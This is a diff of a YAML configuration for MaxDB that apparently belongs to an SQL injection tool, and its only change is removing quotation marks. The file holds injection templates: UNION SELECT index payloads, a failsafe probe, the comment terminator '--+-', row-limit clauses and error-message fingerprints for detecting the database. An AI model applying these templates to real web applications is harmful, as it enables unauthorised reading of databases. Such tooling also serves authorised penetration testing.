@@ -1,4 +1,4 @@
-vendor: ""
+vendor: 
 resource: 
  info: |
   SELECT 
@@ -89,7 +89,7 @@ resource:
         {limit}
     ) a
    fields: 
-    field: "trim(ifnull(chr(${FIELD}), ''))"
+    field: trim(ifnull(chr(${FIELD}), ''))
     concat: "|| '%7f' ||"
     
 strategy: 
@@ -105,8 +105,8 @@ strategy:
    from (
        ${INJECTION}
    ) x
-  limit: "having count(*) between ${LIMIT} and ${LIMIT}"
-  failsafe: "select (1337${INDICE}7330%2b1) r from dual"
+  limit: having count(*) between ${LIMIT} and ${LIMIT}
+  failsafe: select (1337${INDICE}7330%2b1) r from dual
   calibrator: |
    rpad(
        '${CALIBRATOR_SQL}', 
@@ -115,14 +115,14 @@ strategy:
        1025
    )
   limitBoundary: 1
-  endingComment: "--+-"
+  endingComment: --+-
   fingerprint: 
    errorMessage: 
     - "Warning: maxdb::"
-    - "maxdb.query"
+    - maxdb.query
     - "): Invalid end of SQL statement"
     
  normal: 
-  indices: "union select ${RESULT_RANGE} from (${INDICE_UNIQUE})z"
-  capacity: "(select '${LEAD}${INDICE}' || ${CALIBRATOR} from dual)"
-  orderBy: "order by 1337"
+  indices: union select ${RESULT_RANGE} from (${INDICE_UNIQUE})z
+  capacity: (select '${LEAD}${INDICE}' || ${CALIBRATOR} from dual)
+  orderBy: order by 1337
